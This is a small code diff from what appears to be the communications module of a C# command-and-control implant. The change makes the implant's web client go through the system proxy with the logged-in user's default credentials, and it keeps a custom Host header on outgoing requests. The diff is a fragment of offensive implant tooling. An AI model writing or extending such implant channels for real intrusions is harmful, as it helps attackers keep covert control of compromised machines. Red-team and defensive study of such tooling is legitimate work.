@@ -54,7 +54,10 @@ namespace ImplantSide.Classes.Comms
 
             if (_config.UseProxy)
                 if (null == _config.WebProxy)
-                    wc.Proxy = HttpWebRequest.GetSystemWebProxy();
+				{
+					wc.Proxy = HttpWebRequest.GetSystemWebProxy();
+					wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
+				}
                 else 
                     wc.Proxy = _config.WebProxy;
             wc.Headers.Add("Host", _config.HostHeader);
@@ -86,7 +89,6 @@ namespace ImplantSide.Classes.Comms
             Int32 retryInterval = 2000;
             UInt16 retryCount = 0;
             Guid errorId = Guid.NewGuid();
-            //This is only if the command channel has failed first time
             do
             {
                 try
